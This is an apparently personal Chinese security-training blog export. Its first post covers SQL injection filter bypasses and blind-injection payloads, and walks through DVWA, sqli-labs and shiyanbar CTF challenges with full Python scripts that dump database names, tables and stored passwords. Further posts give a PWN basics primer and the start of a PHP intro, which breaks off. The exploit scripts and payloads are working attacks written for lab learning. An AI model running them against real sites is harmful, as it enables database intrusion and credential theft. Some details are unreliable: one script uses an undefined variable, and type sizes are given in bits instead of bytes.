代替</li><li><code>%a0</code> 代替</li><li><code>/**/</code> 代替</li><li>用括号 <code>()</code> 代替</li><li>用 <code>+</code> 代替</li><li>用花括号 <code>{}</code> 代替</li><li>用单引号或双引号代替</li></ul><h2 id="关键表名过滤绕过"><a href="#关键表名过滤绕过" class="headerlink" title="关键表名过滤绕过"></a>关键表名过滤绕过</h2><p><code>information_schema(这里空格).(这里空格)tables</code></p><h2 id="过滤等号"><a href="#过滤等号" class="headerlink" title="过滤等号"></a>过滤等号</h2><p>用 like 可以替代</p><h2 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h2><p><code>0x7573657273</code> 即等于 <code>&quot;users&quot;</code></p><h2 id="过滤大于小于号"><a href="#过滤大于小于号" class="headerlink" title="过滤大于小于号"></a>过滤大于小于号</h2><p>函数 <code>greatest()</code> 和 <code>least()</code> 分别替代 <code>&gt;</code> 和 <code>&lt;</code></p><p>例如：</p><pre><code class="sql">select * from users where id=1 and ascii(substr(database(),1,1))&gt;64</code></pre><p>等价于</p><pre><code class="sql">select * from users where id=1 and greatest(ascii(substr(database(),1,1)),64)=64</code></pre><h2 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h2><p><code>substr(str,1,1)</code>等价于<code>substr(str from 1 for 1)</code></p><h2 id="SLEEP-函数中不能用数字"><a href="#SLEEP-函数中不能用数字" class="headerlink" title="SLEEP 函数中不能用数字"></a>SLEEP 函数中不能用数字</h2><p>用 <code>pi()</code> 和 <code>ceil()</code> 过滤</p><pre><code class="sql">sleep(ceil(pi()))</code></pre><h2 id="过滤注释符（-、-）"><a href="#过滤注释符（-、-）" class="headerlink" title="过滤注释符（#、--+）"></a>过滤注释符（<code>#</code>、<code>--+</code>）</h2><p>用闭合的方式：</p><pre><code class="sql">1&#39; and &#39;1</code></pre><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>在 MYSQL 中是用 GBK 编码时，会认为两个字符为一个汉字。宽字节注入即通过增加一个字符来过滤掉转义字符前的反斜杠</p><p>比如“\’”的 urlencode 编码为%5c%27，在前面加上%df，会使得%df%5c 构成一个汉字，%27 则作为一个单独的单引号</p><h2 id="order-by-被过滤"><a href="#order-by-被过滤" class="headerlink" title="order by 被过滤"></a><code>order by</code> 被过滤</h2><p>使用 into 变量来绕过：</p><pre><code class="sql">select * from users limit 1,1 into @a,@b,@c</code></pre><p>在本地一张有六个字段的表中测试：</p><p><img src="/pics/WEB集训/二/1.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/WEB集训/二/2.png" srcset="/img/loading.gif" alt></p><h2 id="利用等价函数"><a href="#利用等价函数" class="headerlink" title="利用等价函数"></a>利用等价函数</h2><ul><li><code>hex()</code>、<code>bin()</code> ==&gt; <code>ascii()</code></li><li><code>sleep()</code> ==&gt; <code>benchmark()</code></li><li><code>concat_ws()</code> ==&gt; <code>group_concat()</code></li><li><code>mid()</code>、<code>substr()</code> ==&gt; <code>substring()</code></li><li><code>@@user</code> ==&gt; <code>user()</code></li><li><code>@@datadir</code> ==&gt; <code>datadir()</code></li></ul><h2 id="MYSQL-条件注释利用"><a href="#MYSQL-条件注释利用" class="headerlink" title="MYSQL 条件注释利用"></a>MYSQL 条件注释利用</h2><pre><code class="sql">/*!..*/</code></pre><p>以上语句在其他数据库中不执行，但在 MYSQL 中执行</p><pre><code class="sql">/*!50000...*/</code></pre><p>以上语句在 50000 版本以上不执行，否则必执行，用于过滤正则表达式</p><h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>铁盆对 SQL 回显注入的解释：</p><pre><code>我问你叫什么名字，你回答你叫奥特曼。</code></pre><p>而 SQL 盲注是相反的，即不直接显示搜索到的结果，而从其他方式来推断得出结果的 SQL 注入</p><p>SQL 盲注常用函数：</p><ul><li>if 和 case when：用于时间盲注</li><li>substring、substr、mid 等：用于截断字符串</li><li>ascii：使字符变成 ASCII 码</li><li>limit offset：用于猜取内容</li></ul><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>即只有 TRUE 和 FALSE 两种状态，过程中需要猜测，直到正确为止</p><p>铁盆箴言：</p><pre><code>我问你叫什么名字，你只会说是和不是(ture false)。于是就，我问你叫不叫李狗蛋呀，不是。叫不叫王大花呀，不是。一直猜到是为止。但是猜也讲究技巧，一个字一个字的猜的效率比一起猜三个字效率不知道高几倍。</code></pre><ol><li>判断是否有盲注点</li></ol><pre><code class="sql">1&#39; and 1=1 # 返回TRUE1&#39; and 1=2 # 返回FALSE，并且没有返回</code></pre><p>即 SQL 语句执行成功和失败的返回界面存在某种固定的差异</p><ol start="2"><li>猜解库名、表名、列名、内容</li></ol><pre><code class="sql">1&#39; and substr(database(),1,1)=&#39;a&#39; # 猜解库名1&#39; and substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;DatabaseName&#39;),1,1)=&#39;a&#39; # 猜解表名1&#39; and substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;TableName&#39;),1,1)=&#39;a&#39; # 猜解列名1&#39; and substr((select group_concat(SomeThing) from DatabaseName.TableName),1,1)=&#39;a&#39; # 猜解表名</code></pre><p>以上即为基本的猜解过程</p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>即对一个命令只有一个固定的反应，如果是正确的就会等待一定的时间再反应，如果错误立即反应</p><p>铁盆箴言：</p><pre><code>我问你叫什么名字，无论对错，你只会 啊 的叫一声。于是就，是 = 让你立马啊，不是 = 让你过一会再啊，以此区分，就便成布尔型一样了。</code></pre><ol><li>判断是否有盲注点</li></ol><pre><code class="sql">1&#39; and if(1=1,sleep(5),1) # 延迟返回为TRUE1&#39; and if(1=2,sleep(5),1) # 不延迟返回为FALSE</code></pre><p>基本与布尔盲注类似。</p><ol start="2"><li>猜解库名、表名、列名、内容</li></ol><pre><code class="sql">1&#39; and if((substr(database(),1,1)=&#39;a&#39;),sleep(5),1) # 猜解库名1&#39; and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;DatabaseName&#39;),1,1)=&#39;a&#39;),sleep(5),1) # 猜解表名1&#39; and if((substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;TableName&#39;),1,1)=&#39;a&#39;),sleep(5),1) # 猜解列名1&#39; and if((substr((select group_concat(SomeThing) from DatabaseName.TableName),1,1)=&#39;a&#39;),sleep(5),1) # 猜解表名</code></pre><p>以上即为基本的猜解过程。</p><h1 id="DVWA-之-SQL-Injection"><a href="#DVWA-之-SQL-Injection" class="headerlink" title="DVWA 之 SQL Injection"></a>DVWA 之 SQL Injection</h1><p>上课没有认真听，DVWA 安全级别一直开在 high，试了好久都做不出。下面就记录一下解题过程。</p><h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><p><img src="/pics/WEB集训/二/3.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/WEB集训/二/4.png" srcset="/img/loading.gif" alt></p><h2 id="判断字段数"><a href="#判断字段数" class="headerlink" title="判断字段数"></a>判断字段数</h2><p><img src="/pics/WEB集训/二/5.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/WEB集训/二/6.png" srcset="/img/loading.gif" alt></p><h2 id="猜解库名、表名、列名"><a href="#猜解库名、表名、列名" class="headerlink" title="猜解库名、表名、列名"></a>猜解库名、表名、列名</h2><p><img src="/pics/WEB集训/二/7.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/WEB集训/二/8.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/WEB集训/二/9.png" srcset="/img/loading.gif" alt></p><h2 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h2><p><img src="/pics/WEB集训/二/10.png" srcset="/img/loading.gif" alt></p><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><pre><code class="php">&lt;?phpif(isset($_GET[&#39;Submit&#39;])){    // Retrieve data    $id = $_GET[&#39;id&#39;];    $getid = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;&quot;;    $result = mysql_query($getid) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );    $num = mysql_numrows($result);    $i = 0;    while ($i &lt; $num) {        $first = mysql_result($result,$i,&quot;first_name&quot;);        $last = mysql_result($result,$i,&quot;last_name&quot;);        echo &#39;&lt;pre&gt;&#39;;        echo &#39;ID: &#39; . $id . &#39;&lt;br&gt;First name: &#39; . $first . &#39;&lt;br&gt;Surname: &#39; . $last;        echo &#39;&lt;/pre&gt;&#39;;        $i++;    }}?&gt;</code></pre><h1 id="SQL-LABS-MASTER"><a href="#SQL-LABS-MASTER" class="headerlink" title="SQL-LABS-MASTER"></a>SQL-LABS-MASTER</h1><p>这里有个很大的坑。因为自己是在虚拟机上跑的 PHPSTUDY，想用脚本跑盲注的时候觉得有点麻烦，就直接用女朋友的电脑了。但是在女朋友的电脑上发现开不了 APACHE，只能用 NGINX，然后就发现各种脚本跑不出，手注也不行，但是在别人的电脑上明明能跑啊。</p><p>还好有牛逼的啦啦大哥哥帮忙才发现了漏洞。</p><p>在 PHP 的配置文件 php-ini 中发现参数 <code>agc_quotes_gpc</code> 是 on 的，即会对注入时的单引号进行转义，原本的注入点就很难被注入。修改成 off 之后即可</p><p><img src="/pics/WEB集训/二/11.png" srcset="/img/loading.gif" alt></p><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>根据测试可以判断这里为布尔盲注</p><p><img src="/pics/WEB集训/二/12.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/WEB集训/二/13.png" srcset="/img/loading.gif" alt></p><p>脚本如下：</p><pre><code class="python">import requestsurl = &quot;http://127.0.0.1/sqli-labs-master/less-5/index.php?id=&quot;payload = &quot;abcdefghijklmnopqrstuvwxyz1234567890!@#{}_-=+[]&amp;();&quot;def get_databse():    res = &quot;&quot;    for i in range(1, 100):        print(i)        for ch in payload:            sql = &quot;1&#39; and substr(database(),{},1)=&#39;{}&#39;%23&quot;.format(i, ch)            r = requests.get(url + sql)            if(len(r.text) == 704):                res += ch                print(res)                break    print(&quot;Database: &quot;, res)def get_tables():    res = &quot;&quot;    for i in range(1, 100):        print(i)        for ch in payload:            sql = &quot;1&#39; and substr((select group_concat(table_name separator &#39;;&#39;) from information_schema.tables where table_schema=&#39;security&#39;),{},1)=&#39;{}&#39;%23&quot;.format(i, ch)            r = requests.get(url + sql)            if(len(r.text) == 704):                res += ch                print(res)                break    print(&quot;Table names: &quot;, res)def get_columns():    res = &quot;&quot;    for i in range(1, 100):        print(i)        for ch in payload:            sql = &quot;1&#39; and substr((select group_concat(column_name separator &#39;;&#39;) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()),{},1)=&#39;{}&#39;%23&quot;.format(i, ch)            r = requests.get(url + sql)            if(len(r.text) == 704):                res += ch                print(res)                break    print(&quot;Column names: &quot;, res)def get_flag():    res = &quot;&quot;    for i in range(1, 100):        print(i)        for ch in payload:            sql = &quot;1&#39; and substr((select group_concat(password separator &#39;;&#39;) from security.users),{},1)=&#39;{}&#39;%23&quot;.format(i, ch)            r = requests.get(url + sql)            if(len(r.text) == 704):                res += ch                print(res)                break    print(&quot;Flag: &quot;, res)if __name__ == &#39;__main__&#39;:    # get_databse() # 库名：security    # get_tables() # 表名：emails;referers;uagents;users    # get_columns() # 列名：1.id;email_id 2.id;referer;ip_address 3.id;uagent;ip_address;username 4.id;username;password    # 根据以上的结果可以认为需要找的东西在users表中的password字段    get_flag() # dumb;i-kill-you;p@ssword;crappy;stupidity;genious;mob!le;admin;admin1;admin2;admin3;dumbo;admin4</code></pre><p>最后看一看网页源码，其实实现还是很简单的</p><p><img src="/pics/WEB集训/二/14.png" srcset="/img/loading.gif" alt></p><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>根据测试判断为时间盲注</p><p><img src="/pics/WEB集训/二/15.png" srcset="/img/loading.gif" alt></p><p>脚本如下：</p><pre><code class="python">import requestsurl = &quot;http://127.0.0.1/sqli-labs-master/less-9/index.php?id=&quot;payload = &quot;abcdefghijklmnopqrstuvwxyz1234567890!@#{}_-=+[]&amp;();&quot;def get_databse():    res = &quot;&quot;    for i in range(1, 100):        print(i)        for ch in payload:            sql = &quot;1&#39; and if((substr(database(),{},1)=&#39;{}&#39;),sleep(4),1)%23&quot;.format(i, ch)            try:                r = requests.get(url + sql, timeout=3.9)            except requests.exceptions.ReadTimeout:                res += ch                print(res)                break    print(&quot;Database: &quot;, res)def get_tables():    res = &quot;&quot;    for i in range(1, 100):        print(i)        for ch in payload:            sql = &quot;1&#39; and if((substr((select group_concat(table_name separator &#39;;&#39;) from information_schema.tables where table_schema=&#39;security&#39;),{},1)=&#39;{}&#39;),sleep(4),1)%23&quot;.format(i, ch)            try:                r = requests.get(url + sql, timeout=3.9)            except requests.exceptions.ReadTimeout:                res += ch                print(res)                break    print(&quot;Table names: &quot;, res)def get_columns():    res = &quot;&quot;    for i in range(1, 100):        print(i)        for ch in payload:            sql = &quot;1&#39; and if((substr((select group_concat(column_name separator &#39;;&#39;) from information_schema.columns where table_name=&#39;uagents&#39; and table_schema=database()),{},1)=&#39;{}&#39;),sleep(4),1)%23&quot;.format(i, ch)            try:                r = requests.get(url + sql, timeout=3.9)            except requests.exceptions.ReadTimeout:                res += ch                print(res)                break    print(&quot;Column names: &quot;, res)def get_flag():    res = &quot;&quot;    for i in range(1, 100):        print(i)        for ch in payload:            sql = &quot;1&#39; and if((substr((select group_concat(password separator &#39;;&#39;) from security.users),{},1)=&#39;{}&#39;),sleep(4),1)%23&quot;.format(i, ch)            try:                r = requests.get(url + sql, timeout=3.9)            except requests.exceptions.ReadTimeout:                res += ch                print(res)                break    print(&quot;Flag: &quot;, res)if __name__ == &#39;__main__&#39;:    # get_databse() # 库名：security    # get_tables() # 列名：emails;referers;uagents;users    # get_columns() # 表名：1.id;email_id 2.id;referer;ip_address(ip_addkess) 3.id;uagent;ip_address;username 4.id;username(usernahe);password(passkord)    # 由于时间盲注会受到网络的影响，需要多试几次来提高结果的精确度    # 根据以上的结果可以认为需要找的东西在users表中的password字段    get_flag() # dumb;i0kill-you;p@ssword;crappyustupidity;genious;mob!le;admie;admin1;admin2;admin3;dumbo0dmin4</code></pre><p>源码如下：</p><p><img src="/pics/WEB集训/二/16.png" srcset="/img/loading.gif" alt></p><h2 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h2><p>就是过滤了 AND 和 OR，其他的话和 DVWA 的 LOW LEVEL SQL INJECTION 是一样的</p><p><img src="/pics/WEB集训/二/17.png" srcset="/img/loading.gif" alt></p><p>这里 information_schema 库名中也有 or，要记得双写</p><p><img src="/pics/WEB集训/二/18.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/WEB集训/二/19.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/WEB集训/二/20.png" srcset="/img/loading.gif" alt></p><p>password 中的 or 也会被过滤</p><p><img src="/pics/WEB集训/二/21.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/WEB集训/二/22.png" srcset="/img/loading.gif" alt></p><h2 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h2><p>已经能猜到表中有三个字段，所以就不测字段，然后用%A0 替代空格，用%26%26(&amp;&amp;)替代 AND，写出 payload：</p><pre><code class="mysql">0%27%A0union%A0select%A01,database(),3%26%26%271</code></pre><p>因为注释符都被过滤了，所以语句最后通过加上“and ‘1”来绕过</p><p><img src="/pics/WEB集训/二/23.png" srcset="/img/loading.gif" alt></p><p>网页源码是这样的，过滤了好多东西：</p><p><img src="/pics/WEB集训/二/24.png" srcset="/img/loading.gif" alt></p><h2 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h2><p>用大小写交替来绕过过滤，其他过滤和上一题相同，于是直接写出 payload：</p><pre><code class="mysql">0%27uNion%a0SeleCt%a01,database(),3%a0%26%26%271</code></pre><p><img src="/pics/WEB集训/二/25.png" srcset="/img/loading.gif" alt></p><p>网页源码：</p><p><img src="/pics/WEB集训/二/26.png" srcset="/img/loading.gif" alt></p><h1 id="实验吧简单的-sql-注入"><a href="#实验吧简单的-sql-注入" class="headerlink" title="实验吧简单的 sql 注入"></a>实验吧简单的 sql 注入</h1><h2 id="简单的-sql-注入"><a href="#简单的-sql-注入" class="headerlink" title="简单的 sql 注入"></a>简单的 sql 注入</h2><p>通过注入获得 flag 值（提交格式：flag{}）。<br><a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="noopener">解题链接</a></p><p>这里过滤了很多关键字，需要尝试多次以后才能构造出正确的 payload。以下为每一步的 payload。</p><p>获取库名：</p><pre><code class="sql">&#39; unionunion  selectselect  database() &#39;</code></pre><p><img src="/pics/WEB集训/二/27.png" srcset="/img/loading.gif" alt></p><p>获取表名：</p><pre><code class="sql">&#39;  unionunion  selectselect  table_name  fromfrom  information_schema.tables  wherewhere  table_table_schemaschema=&#39;web1</code></pre><p><img src="/pics/WEB集训/二/28.png" srcset="/img/loading.gif" alt></p><p>获取列名：</p><pre><code class="sql">&#39; unionunion  selectselect  column_namcolumn_namee  fromfrom  information_schema.coluinformation_schema.columnsmns  wherewhere  table_table_schemaschema=&#39;web1&#39; andand  table_name=&#39;flag</code></pre><p><img src="/pics/WEB集训/二/29.png" srcset="/img/loading.gif" alt></p><p>得到 flag：</p><pre><code class="sql">&#39; unionunion  selectselect  flag  fromfrom  web1.flag wherewhere  &#39;1&#39;=&#39;1</code></pre><p><img src="/pics/WEB集训/二/30.png" srcset="/img/loading.gif" alt></p><h1 id="简单的-sql-注入-3"><a href="#简单的-sql-注入-3" class="headerlink" title="简单的 sql 注入 3"></a>简单的 sql 注入 3</h1><p>mysql 报错注入<br>格式：flag{}<br><a href="http://ctf5.shiyanbar.com/web/index_3.php" target="_blank" rel="noopener">解题链接</a></p><p>依次输入 <code>1 and 1=1</code> 和 <code>1 and 1=2</code>，发现存在布尔盲注。</p><p><img src="/pics/WEB集训/二/31.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/WEB集训/二/32.png" srcset="/img/loading.gif" alt></p><p>经过上一题直接猜测表名为 <code>flag</code>（如果和上一题一样就可以直接写爆破 flag 的脚本了），返回 hello，说明确实有 <code>flag</code> 这个表。那么就可以直接写脚本爆破了。</p><p><img src="/pics/WEB集训/二/33.png" srcset="/img/loading.gif" alt></p><p>直接爆破 flag 表 flag 字段得到 flag。脚本如下：</p><pre><code class="python">import requests, repayload = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890{}_!@#$^&amp;*().-&quot;url = &quot;http://ctf5.shiyanbar.com/web/index_3.php&quot;def get_flag():    res = &quot;&quot;    for i in range(1, 100):        print(i)        for ch in payload:            sql = &quot;?id=1&#39; and (select flag from flag) like &#39;{}{}%&#39;%23&quot;.format(name, ch)            r = requests.get(url + sql)            if r.text.find(&#39;Hello!&#39;) != -1:                res += ch                print(res)                break    print(&quot;flag: &quot; + res)if __name__ == &#39;__main__&#39;:    get_flag()</code></pre><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://www.2cto.com/database/201607/529000.html" target="_blank" rel="noopener">https://www.2cto.com/database/201607/529000.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWN入门（一）</title>
    <link href="/2018/07/03/PWN%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2018/07/03/PWN%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>学好二进制必须先打好基础。</p><a id="more"></a><p>了解了电脑中的程序如何运行，以及栈在程序运行时是如何变化的。</p><h1 id="程序运行基本原理"><a href="#程序运行基本原理" class="headerlink" title="程序运行基本原理"></a>程序运行基本原理</h1><p>CPU 访问快慢的速度依次为：寄存器-&gt;缓存-&gt;内存-&gt;硬盘。</p><p>硬盘用于永久存储所有的数据。当程序运行时，程序内容会被放进内存中，占用内存的空间。缓存和寄存器则相对速度更快，作为数据和 CPU 之间连接的桥梁。</p><h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>CPU 内部用来存放数据的一些小型存储区域，用来暂时存放参与运算的数据和运算结果。和 CPU 速度相当，空间比较小在 kb 级别。CPU 访问寄存器的速度是最快的。寄存器是一种容量有限的存储器，并且非常小，因此只把一些计算机的指令等一些计算机频繁用到的数据存储在其中，加快直接同内存读取指令和读写数据的速度。</p><h2 id="缓存（CACHE）"><a href="#缓存（CACHE）" class="headerlink" title="缓存（CACHE）"></a>缓存（CACHE）</h2><p>存在于内存与 CPU 之间的存储器，容量比较小但速度比内存高得多，接近于 CPU 的速度，比寄存器要慢 1 倍左右，但是空间可以达到 MB 级别。高速缓存在 CPU 要频繁访问内存中的一些数据时，如果每次都从内存中去读，花费的时间会更多，因此在寄存器和内存之间有了缓存，把 CPU 要频繁访问的一些数据存储在缓冲中，这样效率就会更高。但需要注意的是，缓冲的大小也是很小的，不能存放大量的数据。缓存又可以分为一级和二级缓存，一级的速度大于二级的速度。CPU 向内存读取数据时，首先查询缓存区是否有对应数据，如果有则直接读取，没有再从内存中读取。</p><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>计算机运行过程中的存储主力，用于存储 指令（编译好的代码段），运行中的各个静态，动态，临时变量，外部文件的指针等等。寄存器和高速缓存只是加速存储速度的中间部件，原始运行文件都是先加入到内存中，因此内存的大小决定了一个可运行程序的最大大小。速度比缓存要慢 10 倍左右，但是空间可以达到 GB 级别，当前个人电脑一般都不小于 4G。分为只读（ROM）和随机存储器（RAM）。</p><h2 id="硬盘"><a href="#硬盘" class="headerlink" title="硬盘"></a>硬盘</h2><p>用来存储需要永久存储的文件，归入外存储器，访问速度比内存要慢上万倍，但是价格也比较便宜，空间也很大。</p><h1 id="ASCII-码"><a href="#ASCII-码" class="headerlink" title="ASCII 码"></a>ASCII 码</h1><p><img src="/pics/BIN集训/PWN/一/1.jpg" srcset="/img/loading.gif" alt></p><pre><code class="cpp">#include&lt;stdio.h&gt;int main(){    printf(&quot;%d\n&quot;, &#39;A&#39;);    printf(&quot;%c\n&quot;, 65);}</code></pre><h1 id="小端序"><a href="#小端序" class="headerlink" title="小端序"></a>小端序</h1><p>数据的高位字节存放在地址的高端，低位字节存放在地址的低端</p><h2 id="不同类型数据的字节长度"><a href="#不同类型数据的字节长度" class="headerlink" title="不同类型数据的字节长度"></a>不同类型数据的字节长度</h2><ul><li><strong>sizeof(int)</strong>: 4 bit</li><li><strong>sizeof(short)</strong>: 2 bit</li><li><strong>sizeof(float)</strong>: 4 bit</li><li><strong>sizeof(double)</strong>: 8 bit</li><li><strong>sizeof(char)</strong>: 1 bit</li></ul><h2 id="不同类型数据的小端序存储方式"><a href="#不同类型数据的小端序存储方式" class="headerlink" title="不同类型数据的小端序存储方式"></a>不同类型数据的小端序存储方式</h2><ul><li><strong>int 0x12345678</strong>: 78 56 34 12</li><li><strong>char [] “1234”</strong>: 30 31 32 33 00</li><li><strong>short 0xdead</strong>: ad de</li><li><strong>short 0x12345678</strong>: 34 12 78 56</li></ul><h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><ul><li>先进后出</li><li>从高地址向低地址延伸</li></ul><p>作用：</p><ul><li>暂时保存变量</li><li>调用函数时传递参数</li><li>保存函数返回地址</li></ul><h1 id="调试-SWAP-程序"><a href="#调试-SWAP-程序" class="headerlink" title="调试 SWAP 程序"></a>调试 SWAP 程序</h1><pre><code class="cpp">#include&lt;stdio.h&gt;void swap(int *aa, int *bb){    int cc = *aa;    *aa = *bb;    *bb = cc;}int main(){    int a = 100, b = 2;    swap(&amp;a, &amp;b);    printf(&quot;%d %d\n&quot;, a, b);    return 0;}</code></pre><p>表格模拟程序执行时的栈：</p><table><thead><tr><th style="text-align:center">ADDRESS</th><th style="text-align:center">VALUE</th><th style="text-align:center">NAME</th></tr></thead><tbody><tr><td style="text-align:center">0x7ffee7574978</td><td style="text-align:center">2</td><td style="text-align:center">b</td></tr><tr><td style="text-align:center">0x7ffee7574974</td><td style="text-align:center">100</td><td style="text-align:center">a</td></tr><tr><td style="text-align:center">0x7ffee7574970</td><td style="text-align:center">0x7ffee7574978</td><td style="text-align:center">bb</td></tr><tr><td style="text-align:center">0x7ffee757496c</td><td style="text-align:center">0x7ffee7574974</td><td style="text-align:center">aa</td></tr><tr><td style="text-align:center">0x7ffee7574968</td><td style="text-align:center">??</td><td style="text-align:center">cc</td></tr></tbody></table><p>流程图模拟程序执行时的栈：</p><p><img src="/pics/BIN集训/PWN/一/2.png" srcset="/img/loading.gif" alt></p><p>以下为在 mac 下反汇编出的代码，基本和 linux 下的一致，但是和 windows 下的有一定区别：</p><pre><code class="asm">    0x10958ff10 &lt;+0&gt;:  pushq  %rbp    0x10958ff11 &lt;+1&gt;:  movq   %rsp, %rbp    0x10958ff14 &lt;+4&gt;:  movq   %rdi, -0x8(%rbp)    0x10958ff18 &lt;+8&gt;:  movq   %rsi, -0x10(%rbp)- 0x10958ff1c &lt;+12&gt;: movq   -0x8(%rbp), %rsi    0x10958ff20 &lt;+16&gt;: movl   (%rsi), %eax    0x10958ff22 &lt;+18&gt;: movl   %eax, -0x14(%rbp)    0x10958ff25 &lt;+21&gt;: movq   -0x10(%rbp), %rsi    0x10958ff29 &lt;+25&gt;: movl   (%rsi), %eax    0x10958ff2b &lt;+27&gt;: movq   -0x8(%rbp), %rsi    0x10958ff2f &lt;+31&gt;: movl   %eax, (%rsi)    0x10958ff31 &lt;+33&gt;: movl   -0x14(%rbp), %eax    0x10958ff34 &lt;+36&gt;: movq   -0x10(%rbp), %rsi    0x10958ff38 &lt;+40&gt;: movl   %eax, (%rsi)    0x10958ff3a &lt;+42&gt;: popq   %rbp    0x10958ff3b &lt;+43&gt;: retq</code></pre><p>Linux 下采用的是 AT＆T 的汇编语法格式，Windows 下面采用的是 Intel 汇编语法格式。二者的主要区别在于：</p><ul><li><p>指令操作数的赋值方向是不同的<br>Intel：第一个是目的操作数，第二个是源操作数<br>AT＆T：第一个是源操作数，第二个是目的操作数</p></li><li><p>指令前缀<br>AT＆T：寄存器前边要加上<code>％</code>，立即数前要加上<code>$</code><br>Intel：没有这方面的要求</p></li><li><p>内存单元操作数<br>Intel：基地址使用<code>[]</code><br>AT&amp;T：基地址使用<code>()</code><br>比如：intel 中<code>mov ax, [bx]</code>；AT&amp;T 中<code>movl (%eax), %ebx</code></p></li><li><p>操作码的后缀<br>AT&amp;T 中操作码后面有一个后缀字母: <code>l</code> 32 位, <code>w</code> 16 位, <code>b</code> 8 位<br>Intel 却使用了在操作数前面加<code>dword ptr</code>, <code>word ptr</code>, <code>byte ptr</code>的格式<br>例如: <code>mov al, bl</code>(Intel)；<code>movb %bl, %al</code>(AT&amp;T)</p></li><li><p>AT＆T 中跳转指令标号后的后缀表示跳转方向，<code>f</code>表示向前，<code>b</code>表示向后</p></li></ul><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="https://blog.csdn.net/sinat_37138973/article/details/79012270" target="_blank" rel="noopener">https://blog.csdn.net/sinat_37138973/article/details/79012270</a><br><a href="https://blog.csdn.net/younkerjqb/article/details/53432422" target="_blank" rel="noopener">https://blog.csdn.net/younkerjqb/article/details/53432422</a><br><a href="https://blog.csdn.net/chuchus/article/details/38469403" target="_blank" rel="noopener">https://blog.csdn.net/chuchus/article/details/38469403</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WEB入门（一）</title>
    <link href="/2018/07/02/WEB%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2018/07/02/WEB%E5%85%A5%E9%97%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>今天上午是葛大佬的课，继续好好做笔记。</p><a id="more"></a><p>对数据库的概念更清楚了，通过自己搭建一个有注入的网页对 PHP 和 HTML 的基本函数有了更好的理解。</p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><p>PHP 脚本以<code>&lt;?PHP</code>开头，以<code>?&gt;</code>结尾，默认文件扩展名为<code>.php</code>。PHP 语句以分号<code>;</code>结尾。</p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><pre><code class="PHP">// 单行注释# 单行注释/*多行注释*/</code></pre><h2 id="变量规则"><a href="#变量规则" class="headerlink" title="变量规则"></a>变量规则</h2><ul><li>变量以\$符号开头</li><li>变量名称必须以字母或下划线开头</li><li>变量名称不能以数字开头</li><li>变量名称只能包含字母数字字符和下划线（<code>A-Z</code>、<code>a-z</code>、<code>0-9</code>以及<code>_</code>）</li><li>变量名称对大小写敏感</li></ul><pre><code class="php">&lt;?php    $a = &#39;I am a&#39;;    $b = &#39;I am b&#39;;    echo &#39;$a&#39;;    echo &#39;&lt;br&gt;&#39;;    echo &quot;$b&quot;;?&gt;</code></pre><p><img src="/pics/WEB集训/一/1.png" srcset="/img/loading.gif" alt></p><h1 id="三层架构中的信息流"><a href="#三层架构中的信息流" class="headerlink" title="三层架构中的信息流"></a>三层架构中的信息流</h1><p><img src="/pics/WEB集训/一/2.png" srcset="/img/loading.gif" 